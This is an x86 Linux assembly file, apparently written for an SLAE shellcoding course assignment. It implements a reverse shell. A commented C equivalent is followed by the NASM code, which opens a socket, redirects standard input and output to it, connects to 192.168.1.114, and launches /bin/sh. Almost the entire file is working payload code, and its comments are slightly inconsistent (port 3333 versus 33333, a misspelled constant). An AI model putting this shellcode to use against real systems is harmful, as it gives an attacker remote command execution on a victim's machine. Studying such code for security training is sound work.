; File: shellcode.nasm
; SLAE assignment 2


; 					EQUIVALENT C CODE
; 					sampled from C/echo_server/EC/echo_server.c
;	#include <stdio.h>
;	#include <strings.h>
;	#include <sys/socket.h>
;	#include <netinet/in.h>
;	
;	int main(void)
;	{	
;		// variables used, note for reverse, we are just connecting to a server socket, just using the socketfd
;		int sockfd
;		struct sockaddr_in serv_addr;
;		int BACKLOG = 0;				// MAXCONN now defaults to implementation defined minimum value, usually 1?
;	
;		// socket call #102.1
;		sockfd = socket(AF_INET, SOCK_STREAM, 0);	// AF_INET = 2, SOCK_STREAM = 1 according to header files
;	
;		bzero(&serv_addr, sizeof(serv_addr));		// clearing out the server_addr struct, and configure it
;		serv_addr.sin_family = AF_INT;
;		serv_addr.sin_addr.s_addr = inet_addr("192.168.1.114");	//IP
;		serv_addr.sin_port = htons(3333);			//PORT
;
;
;		//redirect calls #63
;		dup2(sockfd, 0);				// redirect stdinput to sockfd
;		dup2(sockfd, 1);				// redirect stdoutput to sockfd
;		dup2(sockfd, 2);				// redirect stderror to sockfd
;
;		// connect call #102.3
;		connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
;		
;		// execve call #11
;		execve("/bin/sh", ["/bin/sh", NULL], NULL); 			// launch shell
;		
;	}


; SYSTEM CALLS NEEDED:  platform=linux, arch=x86
; 			sys_socketcall 0x66
; 		net.h: 		sys_socket 1
;				sys_connect 3
;			sys_dup2 0x3f
;			sys_execve 0xb



global _start

section .text
_start:

	xor ebx, ebx			; zero out ebx
	mul ebx				; zero out eax, edx


	; socketfd  = socket(AF_INET, SOCK_STREAM, 0)	
	mov al, 0x66			; syscall 102 for sys_socket
	inc ebx				; first parameter 1 for socket call
	push edx			; protocol 0 for default protocol by ISP
	push ebx			; SOCK_STREAM = 1
	inc ebx				; ebx = 0x00000002
	push ebx			; AF_INET = 2	(also 4 bytes occupied array of int 2 as the first element)
	mov ecx, esp			; move socket paramter array into ecx
	
	int 0x80			; socket system call
	xchg ebx, eax			; move returned socketfd into ebx for dup2 first param, ebx = socketfd, eax = 2
	
	
	; dup2(sockfd, 2:0)	
	xor ecx, ecx			; zero out ecx, to be used as simple counter AND fd numbers, 2:error, 1:stdout, 0:stdin
	mov cl, 2			; start from two, finish by 0

	redirect_fd_loop:
		mov al, 0x3f		; sys_dup2 = 0x3f, eax might contain return value so we need to include this instrcution in loop
		int 0x80		; all param should be in place, invoke dup2
		dec ecx			; decrements ecx, so loops to 1 then 0, -1 ...
		jns redirect_fd_loop	; jns = jmp not signed once ecx reaches negative value, SF will set, and break out of loop
	

	; connect(sockfd, (struct serv_addr*)&serv_addr, sizeof(serv_addr))
	mov al, 0x66			; syscall 102 for sys_socket
	xchg ebx, edx			; ebx = 0, edx = sockfd 
	mov bl, 3			; ebx = 3 for socket connect call 

	push 0x7201A8C0			; 192.168.1.114 in reverse in to be read from stack and in respect to lil endianess 
	push word 0x3582		; port 33333 in reverse
	push word 2			; AF_INET
	mov ecx, esp			; serv_addr struct address to ecx
	
	push 16				; size of serv_addr struct
	push ecx			; &serv_addr 
	push edx			; sockfd
	mov ecx, esp			; array of connect params
	int 0x80			; execute connect call

	; execve("bin/sh", ["bin/sh", NULL], NULL)
	mov al, 0xb			; 0xb for syscall 11 for execve
	xor edi, edi			; zeroing out edi
	push edi			; push NULL
	push 0x68732f6e			; hs/n			//bin/sh in reverse
	push 0x69622f2f			; ib//
	mov ebx, esp			; execve first param
	push edi			; push NULL
	push ebx			; push //bin/sh NULL
	mov ecx, esp			; execve second param
	push edi			; PUSH NULL
	mov edx, esp			; execve third param
	int 0x80
	
		
				


















	
